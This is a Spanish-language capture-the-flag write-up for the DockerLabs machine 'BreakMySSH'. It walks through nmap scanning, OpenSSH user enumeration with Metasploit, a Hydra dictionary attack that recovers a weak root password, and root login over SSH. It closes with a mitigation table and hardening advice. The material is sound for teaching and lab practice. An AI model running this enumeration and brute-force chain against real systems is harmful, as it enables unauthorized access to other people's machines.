# BreakMySSH — DockerLabs Writeup

**Platform:** DockerLabs | **Difficulty:** Very Easy | **Target IP:** 172.17.0.2 

## Descripcion 

BreakMySSH es una máquina de dificultad sencilla enfocada en la enumeración y explotación de SSH. Presenta un escenario donde la identificación de usuarios y el uso de credenciales débiles permiten obtener acceso remoto al sistema y alcanzar privilegios root.

## Attack Chain

**Nmap → Metasploit (SSH User Enumeration) → User Disclosure → Hydra + RockYou → SSH Access → Root**

### 1. Identificacion de servicios y puertos abiertos.

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/breakmyssh]
└─$ nmap -sC -sV 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-03 18:53 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
|_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
MAC Address: AE:C6:F2:84:3E:0D (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.29 seconds

```
Verificamos que el unico servicio activo es el SSH, en el puerto 22, con una version de 7.7.

## 2. Enumeracion de usuarios.

Tenemos dos opciones explotar el CVE debido a la version de OpenSSH 7.7 

```
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/breakmyssh]
└─$ searchsploit OpenSSH 7.7
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                          | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)                                                    | linux/remote/45939.py
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
Podriamos descarganos cualquiera de los tres scrips para automatizar la tarea, pero yo lo hare con metasploit para la enumeracion de usuarios.

```
──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/breakmyssh]
└─$ msfconsole -q
msf > use auxiliary/scanner/ssh/ssh_enumusers
[*] Setting default action Malformed Packet - view all 2 actions with the show actions command
msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/metasploit/namelist.txt
USER_FILE => /usr/share/wordlists/metasploit/namelist.txt
msf auxiliary(scanner/ssh/ssh_enumusers) > run
[*] 172.17.0.2:22 - SSH - Using malformed packet technique
[*] 172.17.0.2:22 - SSH - Checking for false positives
[*] 172.17.0.2:22 - SSH - Starting scan
[+] 172.17.0.2:22 - SSH - User 'backup' found
[+] 172.17.0.2:22 - SSH - User 'games' found
[+] 172.17.0.2:22 - SSH - User 'irc' found
[+] 172.17.0.2:22 - SSH - User 'mail' found
[+] 172.17.0.2:22 - SSH - User 'news' found
[+] 172.17.0.2:22 - SSH - User 'proxy' found
[+] 172.17.0.2:22 - SSH - User 'root' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
Obtenemos diversos usuarios, entre ellos vemos el usuario `root` el cual es de nuestro interes ya que es el usuario con maximo privilegios, podriamos buscar la contraseña para el resto de usuarios pero por lo mencionado anteriomente se hata con root.

## 3. Hydra fuerza bruta.

Sabiendo que tenemos el usuario root, procedemos con fuerza bruta obtener la contraseña.

```                                                                                                                            
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/breakmyssh]
└─$ sudo hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f 172.17.0.2 ssh 
[sudo] password for mariano: 
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-03 22:27:50
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: estrella
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-03 22:28:01

```
Obtenemos la contraseña del usuario, del servicio SSH, continuamos con la conexion.

```  
┌──(mariano㉿Kaotic)-[~/Downloads/dockerlabs-machines/01-muy-faciles/breakmyssh]
└─$ ssh root@172.17.0.2
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@172.17.0.2's password: 
Last login: Sun Oct  4 01:31:43 2026 from 172.17.0.1

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@ed2dfeaf8504:~# whoami 
root

```  
Como vemos ingresamos al usuario root el cual tiene dicho permisos.

# Conclusión

A partir del escaneo inicial con Nmap fue posible identificar el servicio **SSH** expuesto en el puerto `22` y determinar que se encontraba ejecutando **OpenSSH 7.7**.

Posteriormente, se utilizó **Metasploit** para realizar una enumeración de usuarios mediante el módulo `ssh_enumusers`, logrando identificar al usuario válido `root`.

Con el usuario identificado, se realizó un ataque de diccionario contra el servicio SSH utilizando **Hydra** y el diccionario `rockyou.txt`. El ataque permitió obtener la contraseña del usuario `root`.

Finalmente, utilizando las credenciales obtenidas, fue posible establecer una conexión mediante SSH y comprobar que se disponía directamente de una sesión con privilegios **root**, obteniendo así el control completo de la máquina.


| Vulnerabilidad / Mala configuración              | Impacto                                                                                                                                          | Mitigación                                                                                                                                                                 |
| ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Servicio SSH expuesto**                        | La exposición del servicio SSH permitió realizar intentos de autenticación remota contra el sistema.                                             | Restringir el acceso a SSH únicamente a redes, direcciones IP o usuarios que realmente lo necesiten.                                                                       |
| **Enumeración de usuarios mediante SSH**         | Fue posible identificar un usuario válido del sistema, proporcionando información útil para realizar posteriores ataques de autenticación.       | Evitar la exposición de información que permita determinar la existencia de usuarios. Mantener actualizado el servicio SSH y aplicar mecanismos de protección adicionales. |
| **Autenticación SSH mediante contraseña**        | Una vez identificado un usuario válido, fue posible realizar un ataque de diccionario contra el servicio SSH.                                    | Preferir autenticación mediante claves SSH y deshabilitar la autenticación por contraseña cuando sea posible.                                                              |
| **Contraseña débil**                             | La contraseña del usuario `root` pudo ser descubierta mediante un ataque de diccionario utilizando `rockyou.txt`.                                | Utilizar contraseñas largas, únicas y resistentes a ataques de diccionario. Evitar contraseñas presentes en diccionarios comunes.                                          |
| **Acceso SSH directo como `root`**               | La obtención de la contraseña permitió iniciar sesión directamente como `root`, sin necesidad de realizar una escalada de privilegios adicional. | Deshabilitar el inicio de sesión directo de `root` mediante SSH (`PermitRootLogin no`) y utilizar cuentas con privilegios mínimos.                                         |
| **Ausencia de protección frente a fuerza bruta** | Hydra pudo realizar múltiples intentos de autenticación contra SSH hasta encontrar las credenciales válidas.                                     | Implementar mecanismos como `Fail2ban`, limitación de intentos, controles de acceso mediante firewall y políticas de bloqueo.                                              |
| **Credenciales de `root` comprometidas**         | Al comprometer directamente la cuenta `root`, fue posible obtener control completo del sistema.                                                  | Proteger especialmente las credenciales administrativas y evitar utilizar `root` para accesos remotos directos. Aplicar el principio de mínimo privilegio.                 |

## Recomendaciones generales

* Mantener los servicios expuestos únicamente cuando sean necesarios.
* Mantener **OpenSSH** y el resto de servicios actualizados.
* Evitar permitir el acceso remoto directo del usuario `root`.
* Preferir **claves SSH** en lugar de autenticación mediante contraseñas.
* Utilizar contraseñas largas, únicas y resistentes a ataques de diccionario.
* Evitar utilizar contraseñas presentes en diccionarios como `rockyou.txt`.
* Implementar mecanismos de protección contra ataques de fuerza bruta.
* Utilizar herramientas como **Fail2ban** para bloquear intentos repetidos de autenticación.
* Restringir el acceso al servicio SSH mediante firewall, redes permitidas o listas de control.
* Revisar periódicamente los usuarios que tienen permitido acceder mediante SSH.
* Aplicar el principio de **mínimo privilegio**.
* Evitar el acceso remoto directo con cuentas administrativas.
* Auditar periódicamente los servicios y puertos expuestos en el sistema.

